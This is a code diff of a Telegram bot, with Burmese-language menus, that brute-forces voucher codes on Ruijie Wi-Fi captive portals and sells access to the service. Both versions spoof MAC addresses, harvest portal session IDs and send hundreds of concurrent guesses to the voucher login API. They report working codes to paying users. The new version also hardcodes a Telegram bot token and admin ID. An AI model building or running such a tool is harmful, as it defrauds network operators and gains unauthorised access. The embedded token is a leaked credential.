@@ -1,588 +1,719 @@
 #!/usr/bin/env python3
-"""
-Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V15.1 (Turbo + Session ID View)
-- Turbo Async Multi-Worker Engine (200 - 500+ req/sec)
-- Real-time Session ID visual notification to User
-- Fully supports Digit, Lower, Upper, and All Mix modes
-- Supports 6, 7, 8 Length selection
-- Render 100% Bug-Free Main Thread Fix
-"""
-
 import os
 import re
 import sys
 import time
-import random
 import string
-import base64
+import random
 import asyncio
-import logging
-from datetime import datetime, timedelta
-
 import aiohttp
-from aiohttp import web
-from telegram import (
-    Update,
-    ReplyKeyboardMarkup,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-)
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    ContextTypes,
-    filters,
-)
+import json
+from datetime import datetime, timedelta
+from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse
 
-# ==================== CONFIG (SECURE VIA ENV) ====================
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-ENV_ADMIN_ID = os.environ.get("ADMIN_ID")
+from telebot.async_telebot import AsyncTeleBot
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 
-try:
-    admin_id = int(ENV_ADMIN_ID) if ENV_ADMIN_ID else None
-except ValueError:
-    admin_id = None
+# ---------------------- CONFIGURATION ----------------------
+BOT_TOKEN = "8967693309:AAGPRrubtTjUBITe7A6spXv2L2LcQ1YkMNU"
+ADMIN_ID = 6968580413
+DATA_FILE = "bot_data.json"
 
-logging.basicConfig(
-    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+# Scanner Limits
+PER_USER_CONCURRENCY = 300 
+PER_SESSION_MAX = 90
+TIMEOUT_SEC = 10
 
-# ==================== MEMORY STORAGE ====================
-authorized_users = {} 
-user_sessions = {}    
-user_states = {}      
+# ---------------------- DATA PERSISTENCE ----------------------
+class DataManager:
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.data = {
+            "authorized_users": {},   # user_id: {"expiry": expiry_str, "daily_limit": int}
+            "user_daily_hits": {},    # user_id: {date_str: hit_count}
+            "users": {}               # user_id: { "urls": [], "tried_codes": [], "success_codes": [], "settings": {...} }
+        }
+        self.load()
 
-global_url_history = {}
+    def load(self):
+        if os.path.exists(self.file_path):
+            try:
+                with open(self.file_path, 'r') as f:
+                    loaded_data = json.load(f)
+                    for key in self.data:
+                        if key in loaded_data:
+                            self.data[key] = loaded_data[key]
+            except Exception as e:
+                print(f"Error loading data: {e}")
+        self.save()
 
-# ==================== PER-USER SESSION ====================
+    def save(self):
+        try:
+            with open(self.file_path, 'w') as f:
+                json.dump(self.data, f, indent=4)
+        except Exception as e:
+            print(f"Error saving data: {e}")
+
+    def is_authorized(self, user_id):
+        if user_id == ADMIN_ID:
+            return True
+        uid = str(user_id)
+        if uid in self.data["authorized_users"]:
+            user_info = self.data["authorized_users"][uid]
+            expiry_str = user_info.get("expiry", "Expired")
+            if expiry_str == "lifetime":
+                return True
+            try:
+                expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
+                if datetime.now() < expiry_date:
+                    return True
+                else:
+                    self.deauthorize(user_id)
+                    return False
+            except:
+                return False
+        return False
+
+    def get_user_info(self, user_id):
+        if user_id == ADMIN_ID:
+            return {"expiry": "♾️ Lifetime Admin", "daily_limit": "♾️ Unlimited"}
+        uid = str(user_id)
+        return self.data["authorized_users"].get(uid, {"expiry": "Expired", "daily_limit": 0})
+
+    def authorize(self, user_id, days, daily_limit):
+        uid = str(user_id)
+        if days == "lifetime":
+            expiry_str = "lifetime"
+        else:
+            expiry_date = datetime.now() + timedelta(days=int(days))
+            expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
+        
+        self.data["authorized_users"][uid] = {
+            "expiry": expiry_str,
+            "daily_limit": int(daily_limit)
+        }
+        self.save()
+        return expiry_str
+
+    def deauthorize(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["authorized_users"]:
+            del self.data["authorized_users"][uid]
+        if uid in self.data["users"]:
+            del self.data["users"][uid]
+        self.save()
+
+    def check_and_add_hit(self, user_id):
+        if user_id == ADMIN_ID:
+            return True
+        uid = str(user_id)
+        today = datetime.now().strftime("%Y-%m-%d")
+        user_info = self.get_user_info(user_id)
+        max_limit = user_info.get("daily_limit", 10)
+
+        if uid not in self.data["user_daily_hits"]:
+            self.data["user_daily_hits"][uid] = {}
+        
+        current_hits = self.data["user_daily_hits"][uid].get(today, 0)
+        if current_hits >= max_limit:
+            return False
+            
+        self.data["user_daily_hits"][uid][today] = current_hits + 1
+        self.save()
+        return True
+
+    def get_today_hits(self, user_id):
+        uid = str(user_id)
+        today = datetime.now().strftime("%Y-%m-%d")
+        if uid in self.data["user_daily_hits"]:
+            return self.data["user_daily_hits"][uid].get(today, 0)
+        return 0
+
+    def add_user_url(self, user_id, url):
+        uid = str(user_id)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
+        
+        if url not in self.data["users"][uid]["urls"]:
+            self.data["users"][uid]["urls"].append(url)
+            self.save()
+            return True
+        return False
+
+    def get_user_data(self, user_id):
+        uid = str(user_id)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {"urls": [], "tried_codes": [], "success_codes": [], "settings": {"char_set": "012345678", "code_len": 6}}
+        else:
+            if "urls" not in self.data["users"][uid]:
+                self.data["users"][uid]["urls"] = []
+            if "tried_codes" not in self.data["users"][uid]:
+                self.data["users"][uid]["tried_codes"] = []
+            if "success_codes" not in self.data["users"][uid]:
+                self.data["users"][uid]["success_codes"] = []
+            if "settings" not in self.data["users"][uid]:
+                self.data["users"][uid]["settings"] = {"char_set": "012345678", "code_len": 6}
+        return self.data["users"][uid]
+
+    def update_user_tried(self, user_id, code):
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            if code not in self.data["users"][uid]["tried_codes"]:
+                self.data["users"][uid]["tried_codes"].append(code)
+                if len(self.data["users"][uid]["tried_codes"]) > 10000:
+                    self.data["users"][uid]["tried_codes"] = self.data["users"][uid]["tried_codes"][-10000:]
+                self.save()
+
+    def add_success_code(self, user_id, code):
+        uid = str(user_id)
+        self.get_user_data(user_id) # Ensure structure exists
+        if code not in self.data["users"][uid]["success_codes"]:
+            self.data["users"][uid]["success_codes"].append(code)
+            self.save()
+
+    def clear_success_codes(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["users"] and "success_codes" in self.data["users"][uid]:
+            self.data["users"][uid]["success_codes"] = []
+            self.save()
+
+    def clear_user_urls(self, user_id):
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            self.data["users"][uid]["urls"] = []
+            self.save()
+
+    def update_user_settings(self, user_id, setting_key, setting_value):
+        uid = str(user_id)
+        if uid in self.data["users"] and "settings" in self.data["users"][uid]:
+            self.data["users"][uid]["settings"][setting_key] = setting_value
+            self.save()
+
+data_manager = DataManager(DATA_FILE)
+
+# ---------------------- USER SESSION MANAGER ----------------------
 class UserSession:
     def __init__(self, user_id):
         self.user_id = user_id
-        self.portal_url = ""
-        self.base_url = "http://192.168.110.1:2060"
-        self.session_id = ""
-        self.is_running = False
-        self.stop_flag = False
-        self.attempts = 0
-        self.found_vouchers = [] 
-        self.current_mode = "all"
-        self.current_length = 6
-        self.start_time = None
-        self.in_running = set()
-        self.concurrency_limit = 250  
-        self.status_message_id = None
+        self.stop_event = asyncio.Event()
+        self.scan_task = None
+        self.stats = {
+            "total_tried": 0,
+            "total_hits": 0,
+            "current_code": "----",
+            "start_time": 0
+        }
+        self.status_msg_id = None
+        self.current_url_index = 0
+        self.state = None 
+        
+    def reset_stats(self):
+        self.stats = {
+            "total_tried": 0,
+            "total_hits": 0,
+            "current_code": "----",
+            "start_time": time.time()
+        }
+        self.stop_event.clear()
 
-    def get_history_set(self):
-        if not self.portal_url:
-            return set()
-        url_key = self.portal_url.split('?')[0] if '?' in self.portal_url else self.portal_url
-        if url_key not in global_url_history:
-            global_url_history[url_key] = set()
-        return global_url_history[url_key]
+user_sessions = {}
 
-def get_user_session(user_id):
+def get_session(user_id) -> UserSession:
     if user_id not in user_sessions:
         user_sessions[user_id] = UserSession(user_id)
     return user_sessions[user_id]
 
-# ==================== HELPER FUNCTIONS ====================
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
-    return ":".join(f"{x:02x}" for x in mac)
+# ---------------------- SCANNING ENGINE ----------------------
+bot = AsyncTeleBot(BOT_TOKEN)
 
-def replace_mac(url, new_mac):
-    if "mac=" in url:
-        return re.sub(r"mac=[^&]*", f"mac={new_mac}", url)
-    return url + f"&mac={new_mac}"
+def generate_random_mac():
+    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
 
-async def get_session_id(http_session, session_url, previous_session_id):
-    if not session_url:
-        return previous_session_id
-        
-    url_match = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", session_url)
-    if url_match:
-        return url_match.group(1).strip()
-        
-    if "ruijienetworks.com" in session_url:
-        return "cloud_session_active"
-
-    mac = get_mac()
-    test_url = replace_mac(session_url, new_mac=mac)
+async def get_sid_from_gateway(session, portal_url):
     headers = {
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     }
     try:
-        async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=3) as req:
-            response = str(req.url)
-            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", response)
-            if session_id:
-                return session_id.group(1)
-            
-            html = await req.text()
-            sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
-            if sid_match:
-                return sid_match.group(1)
-    except:
-        pass
-    return previous_session_id
-
-# ==================== RANDOM GENERATORS ====================
-def generate_random_voucher(mode, length, history_set, in_running):
-    if mode == "digit":
-        chars = string.digits
-    elif mode == "lower":
-        chars = string.ascii_lowercase
-    elif mode == "upper":
-        chars = string.ascii_uppercase
-    else:
-        chars = string.digits + string.ascii_lowercase + string.ascii_uppercase
-
-    while True:
-        voucher = "".join(random.choices(chars, k=length))
-        if voucher not in history_set and voucher not in in_running:
-            return voucher
-
-# ==================== LOGIN WORKER ====================
-async def login_voucher_async(http_session, session_id, voucher, base_url, portal_url):
-    if "ruijienetworks.com" in base_url:
-        if "wifidog" in portal_url:
-            login_url = portal_url.replace("stage=portal", "stage=login")
-            if "voucher=" in login_url:
-                login_url = re.sub(r'voucher=[^&]+', f'voucher={voucher}', login_url)
-            else:
-                login_url += f"&voucher={voucher}"
-        else:
-            login_url = f"{base_url}/api/auth/wifidog?stage=login&voucher={voucher}"
-            
-        mac = get_mac()
-        login_url = replace_mac(login_url, new_mac=mac)
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Referer": portal_url}
+        u = urlparse(portal_url)
+        query = parse_qs(u.query)
+        query['mac'] = [generate_random_mac()]
+        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
         
-        try:
-            async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=1.5) as req:
-                html = await req.text()
-                success = ("success" in html.lower() or req.status in [302, 301])
-                return voucher, success, html
-        except:
-            return voucher, False, ""
+        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
+            body = await r2.text()
+            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
+            if match:
+                final_url = urljoin(spoofed_url, match.group(1))
+                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
+                    final_url = str(r3.url)
+            else:
+                final_url = str(r2.url)
             
-    else:
-        if not session_id:
-            return voucher, False, ""
-        url = f"{base_url}/api/auth/voucher/"
-        data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro)",
-        }
-        try:
-            async with http_session.post(url, json=data, headers=headers, ssl=False, timeout=1.5) as req:
-                res_text = await req.text()
-                success = ("logonUrl" in res_text or '"result":true' in res_text or '"code":0' in res_text)
-                return voucher, success, res_text
-        except:
-            return voucher, False, ""
+            parsed_query = parse_qs(urlparse(final_url).query)
+            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
+            return sid
+    except Exception as e:
+        print(f"Error getting SID from gateway {portal_url}: {e}")
+        return None
 
-def parse_validity(response_text):
-    for pattern in [r'"remainTime"\s*:\s*"?(\d+)"?', r'"validTime"\s*:\s*"?(\d+)"?']:
-        match = re.search(pattern, response_text)
-        if match:
-            seconds = int(match.group(1))
-            if seconds == 0: return "Unlimited"
-            return f"{seconds // 3600} နာရီ {(seconds % 3600) // 60} မိနစ်"
-    return "အကန့်အသတ်မရှိ"
+async def worker_task(user_id, app_session):
+    session = get_session(user_id)
+    u_data = data_manager.get_user_data(user_id)
+    urls = u_data["urls"]
+    if not urls: 
+        return
 
-# ==================== ACCESS CONTROLS ====================
-def is_admin(user_id):
-    return admin_id is not None and user_id == admin_id
-
-def is_authorized(user_id):
-    if is_admin(user_id): return True
-    if user_id in authorized_users:
-        info = authorized_users[user_id]
-        if datetime.now() < info["expires"]:
-            today = datetime.now().date()
-            if info["last_reset"] != today:
-                info["found_today"] = 0
-                info["last_reset"] = today
-            return True
-        else:
-            del authorized_users[user_id]
-    return False
-
-def get_remaining_daily(user_id):
-    if is_admin(user_id): return 999999
-    if user_id in authorized_users:
-        info = authorized_users[user_id]
-        return max(0, info["daily_limit"] - info["found_today"])
-    return 0
-
-# ==================== KEYBOARDS ====================
-def admin_menu():
-    return ReplyKeyboardMarkup(
-        [
-            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
-            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
-            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"],
-            ["👥 Admin ခွင့်ပြုထားသော Users", "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်"]
-        ],
-        resize_keyboard=True
-    )
-
-def user_menu():
-    return ReplyKeyboardMarkup(
-        [
-            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
-            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
-            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"]
-        ],
-        resize_keyboard=True
-    )
-
-def unauthorized_menu():
-    return ReplyKeyboardMarkup(
-        [["🔑 Access Key ဝယ်ယူရန်", "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်"]],
-        resize_keyboard=True
-    )
-
-# ==================== ULTRA TURBO ENGINE ====================
-async def worker(queue, http_session, us, history_set, bot, chat_id, user_id):
-    while not us.stop_flag:
-        voucher = await queue.get()
-        if voucher is None:
-            queue.task_done()
+    char_set = u_data["settings"]["char_set"]
+    code_len = u_data["settings"]["code_len"]
+    tried_codes = set(u_data["tried_codes"])
+    
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'
+    }
+    
+    my_sid = None
+    use_count = 0
+    
+    while not session.stop_event.is_set():
+        if not data_manager.is_authorized(user_id):
+            session.stop_event.set()
+            await bot.send_message(user_id, "⚠️ <b>သင့်ရဲ့ သက်တမ်းကုန်ဆုံးသွားသောကြောင့် Scanner ကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
             break
+
+        current_url = urls[session.current_url_index % len(urls)]
+        base_url = f"{urlparse(current_url).scheme}://{urlparse(current_url).netloc}"
+
+        if my_sid is None or use_count >= PER_SESSION_MAX:
+            my_sid = await get_sid_from_gateway(app_session, current_url)
+            if not my_sid:
+                session.current_url_index += 1
+                await asyncio.sleep(0.1)
+                continue
+            use_count = 0
+
+        code = ''.join(random.choices(char_set, k=code_len))
+        if code in tried_codes: 
+            continue
+        tried_codes.add(code)
+        data_manager.update_user_tried(user_id, code)
         
+        session.stats["current_code"] = code
         try:
-            voucher, success, response_text = await login_voucher_async(
-                http_session, us.session_id, voucher, us.base_url, us.portal_url
+            api_url = f"{base_url}/api/auth/voucher/"
+            payload = {'accessCode': code, 'sessionId': my_sid, 'apiVersion': 1}
+            
+            async with app_session.post(api_url, json=payload, headers=headers, timeout=5, ssl=False) as r:
+                session.stats["total_tried"] += 1
+                use_count += 1
+                res_text = (await r.text()).lower()
+                
+                if '"success":true' in res_text:
+                    if data_manager.check_and_add_hit(user_id):
+                        session.stats["total_hits"] += 1
+                        data_manager.add_success_code(user_id, code) # Save found success code
+                        await bot.send_message(user_id, f"✅ <b>FOUND SUCCESS CODE:</b> <code>{code}</code>", parse_mode="HTML")
+                    else:
+                        session.stop_event.set()
+                        await bot.send_message(user_id, f"🚫 <b>ယနေ့အတွက် Success Code ရှာဖွေနိုင်မှု ကန့်သတ်ချက် ပြည့်သွားပြီဖြစ်၍ စကင်နာကို ရပ်တန့်လိုက်ပါပြီ။</b>", parse_mode="HTML")
+                        break
+                
+                if "request limited" in res_text :
+                    my_sid = None
+        except Exception as e:
+            my_sid = None
+            await asyncio.sleep(0.1)
+
+async def dashboard_updater(user_id):
+    session = get_session(user_id)
+    while not session.stop_event.is_set():
+        if session.status_msg_id:
+            elapsed = time.time() - session.stats["start_time"]
+            speed = session.stats["total_tried"] / elapsed if elapsed > 0 else 0
+            current_time_str = datetime.now().strftime("%I:%M:%S %p")
+            today_hits = data_manager.get_today_hits(user_id)
+            user_info = data_manager.get_user_info(user_id)
+            max_limit = user_info.get("daily_limit", 10)
+            
+            text = (
+                f"🔥 <b>ALADDIN IMMORTAL SCANNER V11</b> 🔥\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⏰ <b>🕒 LIVE CLOCK:</b> <code>{current_time_str}</code>\n"
+                f"🚀 <b>SPEED:</b> {speed:.1f} c/s\n"
+                f"🏹 <b>TRIED:</b> {session.stats['total_tried']:,}\n"
+                f"🎯 <b>HITS (TODAY):</b> {today_hits}/{max_limit} FOUND\n"
+                f"🔑 <b>CURRENT TRY:</b> <code>{session.stats['current_code']}</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"ℹ️ <i>Results will be sent instantly. You can pause anytime.</i>"
             )
-            us.attempts += 1
-            history_set.add(voucher)
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton(text="🛑 STOP & PAUSE SCANNER", callback_data="stop_scan"))
+            try:
+                await bot.edit_message_text(chat_id=user_id, message_id=session.status_msg_id, text=text, reply_markup=markup, parse_mode="HTML")
+            except Exception as e:
+                session.status_msg_id = None
+        await asyncio.sleep(3)
 
-            if success:
-                validity = parse_validity(response_text)
-                success_data = {
-                    "code": voucher,
-                    "time": datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
-                    "validity": validity
-                }
-                us.found_vouchers.append(success_data)
-                if not is_admin(user_id) and user_id in authorized_users:
-                    authorized_users[user_id]["found_today"] += 1
+async def main_scanner_task(user_id):
+    connector = aiohttp.TCPConnector(limit=PER_USER_CONCURRENCY,limit_per_host=0, ttl_dns_cache=300, ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as app_session:
+        tasks = [asyncio.create_task(dashboard_updater(user_id))]
+        tasks.extend([asyncio.create_task(worker_task(user_id, app_session)) for _ in range(PER_USER_CONCURRENCY)])
+        await asyncio.gather(*tasks)
 
-                await bot.send_message(
-                    chat_id=chat_id,
-                    text=f"🎉 **SUCCESS VOUCHER CODE တွေ့ရှိပါပြီ!** 🎉\n\n"
-                         f"🔑 **Code:** `{voucher}`\n"
-                         f"⏱ **သက်တမ်း:** {validity}\n"
-                         f"📊 **စမ်းသပ်မှုအကြိမ်ရေ:** {us.attempts} ကြိမ်မြောက်တွင်တွေ့သည်",
-                    parse_mode="Markdown"
-                )
-        except:
-            pass
-        finally:
-            us.in_running.discard(voucher)
-            queue.task_done()
+# ---------------------- BOT KEYBOARD MENUS ----------------------
 
-async def high_speed_bruteforce(bot, chat_id, user_id):
-    us = get_user_session(user_id)
-    us.is_running = True
-    us.stop_flag = False
-    us.attempts = 0
-    us.start_time = datetime.now()
-    history_set = us.get_history_set()
+def get_user_keyboard(user_id):
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add(KeyboardButton("🔗 ADD PORTAL URL"), KeyboardButton("📄 MY URLS"))
+    markup.add(KeyboardButton("⚙️ SETUP CONFIG MOD"), KeyboardButton("🚀 START SCAN"))
+    markup.add(KeyboardButton("📄 MY SUCCESS CODES")) # New Keyboard Button added here
+    if user_id == ADMIN_ID:
+        markup.add(KeyboardButton("🔑 ADMIN PANEL"))
+    return markup
 
-    status_msg = await bot.send_message(
-        chat_id=chat_id,
-        text="⚡ **Turbo Engine ကို စတင်နှိုးနေပါပြီ...**\n⚙️ Portal Link မှ Session ID ကို ရှာဖွေစစ်ဆေးနေပါသည်...",
-        parse_mode="Markdown"
+def get_unauth_keyboard():
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add(KeyboardButton("🛒 Access Key ဝယ်ယူရန်"))
+    markup.add(KeyboardButton("💵 Ngwe Lwe Pyay Sar Po Yan"))
+    return markup
+
+def get_admin_panel_keyboard():
+    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
+    markup.add(KeyboardButton("👥 Admin ခွင့်ပြုပေးထားသော User များ"))
+    markup.add(KeyboardButton("🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်"))
+    markup.add(KeyboardButton("🔙 BACK TO MAIN"))
+    return markup
+
+@bot.message_handler(commands=['start'])
+async def cmd_start(message):
+    user_id = message.from_user.id
+    session = get_session(user_id)
+    session.state = None 
+
+    if not data_manager.is_authorized(user_id):
+        await bot.reply_to(
+            message, 
+            "✨ <b>မင်္ဂလာပါခင်ဗျာ</b> ၊ Bot ကို အသုံးပြုခွင့်မရှိသေးပါ ၊ ❌\n\n"
+            "⚠️ <b>👉 ကျေးဇူးပြု၍ အောက်ပါ Menu မှတစ်ဆင့် ဝယ်ယူပါ</b> 👈", 
+            reply_markup=get_unauth_keyboard(),
+            parse_mode="HTML"
+        )
+        return
+
+    user_info = data_manager.get_user_info(user_id)
+    await bot.reply_to(
+        message,
+        f"👋 <b>Welcome back to Premium Aladdin Scanner Mode!</b>\n\n"
+        f"👤 <b>Your ID:</b> <code>{user_id}</code>\n"
+        f"⏳ <b>Valid Until:</b> <code>{user_info['expiry']}</code>\n"
+        f"🎯 <b>Daily Max Limit:</b> <code>{user_info['daily_limit']} Hits</code>\n\n"
+        f"✨ စက်ဝိုင်းစနစ်ဖြင့် စကင်ဖတ်ရန် အောက်ပါ Keyboard ခလုတ်များကို သုံးနိုင်ပါပြီ။",
+        reply_markup=get_user_keyboard(user_id),
+        parse_mode="HTML"
     )
-    us.status_message_id = status_msg.message_id
 
-    connector = aiohttp.TCPConnector(limit=us.concurrency_limit, force_close=False, ttl_dns_cache=600)
-    timeout = aiohttp.ClientTimeout(total=5)
-    
-    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as http_session:
-        us.session_id = await get_session_id(http_session, us.portal_url, us.session_id)
-        
-        if not us.session_id:
-            await bot.edit_message_text(
-                chat_id=chat_id, message_id=us.status_message_id,
-                text="❌ **Portal Link မှ Session ID ရယူ၍ မရနိုင်ပါ။ Link သက်တမ်းကုန်သွားခြင်း (သို့) မှားယွင်းနေခြင်း ဖြစ်နိုင်ပါသည်။**"
-            )
-            us.is_running = False
-            return
+# ---------------------- MESSAGE HANDLER FOR ALL INPUTS ----------------------
+@bot.message_handler(content_types=['photo', 'text'])
+async def handle_bot_inputs(message):
+    user_id = message.from_user.id
+    session = get_session(user_id)
 
-        # User စိတ်ချရအောင် Session ID အား Notification အဖြစ် တိုက်ရိုက်ပြသပေးမည့် Logic
-        await bot.send_message(
-            chat_id=chat_id,
-            text=f"🔗 **Session Connected Successfully!**\n🔑 **Found Session ID:** `{us.session_id}`\n\n🚀 စမ်းသပ်ရှာဖွေမှုကို စတင်ပါပြီဗျာ။",
-            parse_mode="Markdown"
+    # 1. Processing Receipt Photo Upload (Photo Event)
+    if message.content_type == 'photo':
+        await bot.reply_to(
+            message, 
+            "📩 <b>Admin ထံသို့ ပို့ပေးနေပါသည် ၊ ခေတ္တ စောင့်ဆိုင်းပေးပါခင်ဗျာ။</b>\n\n"
+            "⚜️ Admin မှ ခွင့်ပြုပြီးပါက Bot အား အသုံးပြုခွင့် ရလာပါမည်။ ကျေးဇူးတင်ပါတယ်! ✨"
         )
+        
+        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
+        admin_alert = (
+            "📥 <b>[ငွေလွှဲပြေစာ အသစ်ရောက်ရှိလာပါသည်]</b> 📥\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>User:</b> {message.from_user.first_name}\n"
+            f"🆔 <b>Telegram ID:</b> <code>{user_id}</code>\n"
+            f"🔗 <b>Username:</b> {username}\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "⚡ <b>[Admin အတည်ပြုပေးရန် ရိုက်ထည့်ရမည့် ပုံစံ]</b>\n"
+            f"<code>{user_id} | ရက်အရေအတွက် | နေ့စဉ် Limit</code>\n\n"
+            "<i>✍️ ဥပမာ - ၁လစာအတွက် အောက်ပါအတိုင်း ကူးယူ၍ ရိုက်ပို့ပါ-</i>\n"
+            f"<code>{user_id} | 30 | 10</code>"
+        )
+        await bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=admin_alert, parse_mode="HTML")
+        return
 
-        queue = asyncio.Queue(maxsize=us.concurrency_limit * 2)
-        workers = []
-        for _ in range(us.concurrency_limit):
-            task = asyncio.create_task(worker(queue, http_session, us, history_set, bot, chat_id, user_id))
-            workers.append(task)
+    # 2. Text Input Logic
+    if message.content_type == 'text':
+        text_data = message.text.strip()
 
-        last_ui_update = time.time()
-
-        try:
-            while not us.stop_flag:
-                if not is_admin(user_id) and get_remaining_daily(user_id) <= 0:
-                    break
-                
-                while queue.qsize() < us.concurrency_limit and not us.stop_flag:
-                    v_code = generate_random_voucher(us.current_mode, us.current_length, history_set, us.in_running)
-                    us.in_running.add(v_code)
-                    await queue.put(v_code)
-                
-                now = time.time()
-                if now - last_ui_update >= 3:
-                    elapsed = now - time.mktime(us.start_time.timetuple())
-                    speed = us.attempts / elapsed if elapsed > 0 else 0
+        # --- ADMIN DIRECT ACTIVATION COMMAND LOGIC ---
+        if user_id == ADMIN_ID and "|" in text_data:
+            parts = [p.strip() for p in text_data.split("|")]
+            if len(parts) == 3:
+                try:
+                    target_id = int(parts[0])
+                    days_input = parts[1]
+                    daily_limit = int(parts[2])
+                    
+                    expiry_result = data_manager.authorize(target_id, days_input, daily_limit)
+                    
+                    await bot.reply_to(
+                        message, 
+                        f"✅ <b>User အား အောင်မြင်စွာ ခွင့်ပြုလိုက်ပါပြီ။</b>\n\n"
+                        f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
+                        f"⏳ <b>Expiry:</b> <code>{expiry_result}</code>\n"
+                        f"🎯 <b>Daily Limit:</b> <code>{daily_limit} Hits</code>",
+                        reply_markup=get_admin_panel_keyboard() if text_data.startswith(str(ADMIN_ID)) else None,
+                        parse_mode="HTML"
+                    )
+                    
                     try:
-                        await bot.edit_message_text(
-                            chat_id=chat_id, message_id=us.status_message_id,
-                            text=f"⚡ **ကုဒ်များကို အရှိန်ပြင်းစွာ (Turbo Mode) ရှာဖွေနေပါသည်...**\n\n"
-                                 f"🔑 **Active Session:** `{us.session_id[:20]}...`\n"
-                                 f"📊 **ရှာပြီး:** {us.attempts} ကြိမ်\n"
-                                 f"⚡ **အမြန်နှုန်း:** {speed:.1f} req/sec\n"
-                                 f"🏆 **တွေ့ရှိမှု:** {len(us.found_vouchers)} ခု",
+                        await bot.send_message(
+                            target_id,
+                            f"🎉 <b>Admin ထံမှ ခွင့်ပြုချက် ရပါပီ ခင်မျာ၊ သင့် Key သက်တမ်းမှာ-</b>\n\n"
+                            f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
+                            f"⏳ <b>Expired Time:</b> <code>{expiry_result}</code>\n"
+                            f"🎯 <b>Daily Success Code Limit:</b> <code>{daily_limit} Hits</code>",
+                            reply_markup=get_user_keyboard(target_id),
+                            parse_mode="HTML"
                         )
-                    except:
-                        pass
-                    last_ui_update = now
+                    except Exception as e:
+                        await bot.reply_to(message, f"⚠️ User ထံ စာပို့၍မရပါ (Bot အား Start မလုပ်ရသေးပါ)။")
+                    return
+                except ValueError:
+                    await bot.reply_to(message, "❌ <b>ရိုက်ထည့်သော Format လွဲမှားနေပါသည်။</b> ID နှင့် Limit ကို ကိန်းဂဏန်းများဖြင့်သာ သေချာထည့်ပေးပါ။")
+                    return
 
-                await asyncio.sleep(0.01)
-
-        finally:
-            us.stop_flag = True
-            for _ in range(us.concurrency_limit):
-                await queue.put(None)
